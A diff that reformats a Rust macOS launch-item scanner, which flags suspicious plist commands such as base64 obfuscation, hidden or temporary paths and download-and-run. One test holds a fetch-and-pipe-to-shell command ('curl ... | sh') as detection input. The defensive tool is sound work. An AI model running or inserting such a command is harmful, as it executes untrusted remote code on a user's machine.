@@ -57,18 +57,11 @@ fn examine(runner: &dyn CommandRunner, plists: &[PathBuf], unreadable_dirs: &[Pa
 
     let mut suspicious: Vec<String> = Vec::new();
     // Names of the items (and directories) that could not be inspected.
-    let mut unreadable: Vec<String> = unreadable_dirs
-        .iter()
-        .map(|dir| dir.display().to_string())
-        .collect();
+    let mut unreadable: Vec<String> = unreadable_dirs.iter().map(|dir| dir.display().to_string()).collect();
     let mut first_error: Option<String> = None;
 
     for path in plists {
-        let file = path
-            .file_name()
-            .unwrap_or_default()
-            .to_string_lossy()
-            .into_owned();
+        let file = path.file_name().unwrap_or_default().to_string_lossy().into_owned();
         match read_command(runner, &path.to_string_lossy()) {
             Ok(command) => {
                 if let Some(reason) = suspicion(&command) {
@@ -101,9 +94,7 @@ fn examine(runner: &dyn CommandRunner, plists: &[PathBuf], unreadable_dirs: &[Pa
         // Nothing at all could be read: most likely `plutil` itself is the
         // problem, so there is no finding, only a missing answer.
         let reason = first_error.unwrap_or_else(|| "the directory is not readable".to_string());
-        return Outcome::unknown(format!(
-            "None of the {total} launch items could be read ({reason})."
-        ));
+        return Outcome::unknown(format!("None of the {total} launch items could be read ({reason})."));
     }
 
     Outcome::warn(
@@ -155,8 +146,8 @@ fn read_command(runner: &dyn CommandRunner, path: &str) -> Result<Vec<String>, S
     let mut command: Vec<String> = Vec::new();
     command.extend(program);
     if let Some(json) = arguments {
-        let values: Vec<Value> = serde_json::from_str(&json)
-            .map_err(|_| "ProgramArguments is not a list".to_string())?;
+        let values: Vec<Value> =
+            serde_json::from_str(&json).map_err(|_| "ProgramArguments is not a list".to_string())?;
         for value in values {
             match value {
                 Value::String(argument) => command.push(argument),
@@ -169,12 +160,7 @@ fn read_command(runner: &dyn CommandRunner, path: &str) -> Result<Vec<String>, S
 
 /// Extracts one top-level key. `Ok(None)` means the key does not exist;
 /// `Err` means the value could not be read at all.
-fn extract(
-    runner: &dyn CommandRunner,
-    key: &str,
-    format: &str,
-    path: &str,
-) -> Result<Option<String>, String> {
+fn extract(runner: &dyn CommandRunner, key: &str, format: &str, path: &str) -> Result<Option<String>, String> {
     let out = runner.run("plutil", &["-extract", key, format, "-o", "-", path])?;
     if out.success {
         return Ok(Some(out.stdout));
@@ -258,10 +244,7 @@ fn suspicion(command: &[String]) -> Option<&'static str> {
         return Some("runs a command obfuscated with base64");
     }
 
-    let argument_paths: Vec<&str> = command[1..]
-        .iter()
-        .flat_map(|argument| paths_in(argument))
-        .collect();
+    let argument_paths: Vec<&str> = command[1..].iter().flat_map(|argument| paths_in(argument)).collect();
     if argument_paths.iter().any(|path| in_temp_dir(path)) {
         return Some("is given a path in a temporary/shared directory");
     }
@@ -277,8 +260,7 @@ fn in_temp_dir(path: &str) -> bool {
 
 /// A path component that starts with a dot, such as "/Users/x/.hidden/tool".
 fn in_hidden_dir(path: &str) -> bool {
-    path.split('/')
-        .any(|part| part.starts_with('.') && part.len() > 1)
+    path.split('/').any(|part| part.starts_with('.') && part.len() > 1)
 }
 
 /// The file-system paths mentioned in an argument.
@@ -319,15 +301,12 @@ mod tests {
 
     /// A mock in which `path` is a plist with only `ProgramArguments`.
     fn with_arguments(runner: MockRunner, path: &str, json: &str) -> MockRunner {
-        runner
-            .fail(&program_cmd(path), NO_KEY)
-            .ok(&arguments_cmd(path), json)
+        runner.fail(&program_cmd(path), NO_KEY).ok(&arguments_cmd(path), json)
     }
 
     #[test]
     fn ordinary_app_is_not_suspicious() {
-        let ordinary =
-            command(&["/Applications/Cloudflare WARP.app/Contents/Resources/CloudflareWARP"]);
+        let ordinary = command(&["/Applications/Cloudflare WARP.app/Contents/Resources/CloudflareWARP"]);
         assert_eq!(suspicion(&ordinary), None);
 
         let with_options = command(&[
@@ -379,10 +358,7 @@ mod tests {
     #[test]
     fn download_and_run_is_suspicious() {
         let downloader = command(&["/bin/sh", "-c", "curl -s http://example.com/x | sh"]);
-        assert_eq!(
-            suspicion(&downloader),
-            Some("directly runs a script it downloads")
-        );
+        assert_eq!(suspicion(&downloader), Some("directly runs a script it downloads"));
     }
 
     #[test]
@@ -442,8 +418,14 @@ mod tests {
 
         // plutil fails outright on one item.
         let failing = clean()
-            .fail(&program_cmd(bad), "bad.plist: Property List error: Unexpected character")
-            .fail(&arguments_cmd(bad), "bad.plist: Property List error: Unexpected character");
+            .fail(
+                &program_cmd(bad),
+                "bad.plist: Property List error: Unexpected character",
+            )
+            .fail(
+                &arguments_cmd(bad),
+                "bad.plist: Property List error: Unexpected character",
+            );
         let outcome = examine(&failing, &both, &[]);
         assert_eq!(outcome.status, Status::Warn);
         assert!(outcome.detail.contains("1 of 2"), "{}", outcome.detail);
@@ -454,7 +436,10 @@ mod tests {
         let corrupt = clean()
             .fail(&program_cmd(bad), NO_KEY)
             .fail(&arguments_cmd(bad), NO_KEY)
-            .fail(&format!("plutil -lint {bad}"), "bad.plist: Unexpected character g at line 1");
+            .fail(
+                &format!("plutil -lint {bad}"),
+                "bad.plist: Unexpected character g at line 1",
+            );
         assert_eq!(examine(&corrupt, &both, &[]).status, Status::Warn);
 
         // ProgramArguments of the wrong shape.
@@ -493,16 +478,17 @@ mod tests {
         let outcome = examine(&runner, &[PathBuf::from(bad), PathBuf::from(evil)], &[]);
         assert_eq!(outcome.status, Status::Warn);
         assert!(outcome.detail.contains("evil.plist (runs from"), "{}", outcome.detail);
-        assert!(outcome.detail.contains("Could not be read: bad.plist"), "{}", outcome.detail);
+        assert!(
+            outcome.detail.contains("Could not be read: bad.plist"),
+            "{}",
+            outcome.detail
+        );
     }
 
     #[test]
     fn long_lists_are_cut_short() {
         let names: Vec<String> = (1..=8).map(|n| format!("{n}.plist")).collect();
-        assert_eq!(
-            listed(&names),
-            "1.plist, 2.plist, 3.plist, 4.plist, 5.plist and 3 more"
-        );
+        assert_eq!(listed(&names), "1.plist, 2.plist, 3.plist, 4.plist, 5.plist and 3 more");
         assert_eq!(listed(&names[..2]), "1.plist, 2.plist");
     }
 
@@ -516,8 +502,7 @@ mod tests {
         // Exists but is not a directory, so it cannot be listed.
         let not_a_dir = dir.join("not.txt");
 
-        let (found, unreadable) =
-            find_plists(&[dir.clone(), dir.join("missing"), not_a_dir.clone()]);
+        let (found, unreadable) = find_plists(&[dir.clone(), dir.join("missing"), not_a_dir.clone()]);
         std::fs::remove_dir_all(&dir).unwrap();
 
         let names: Vec<_> = found
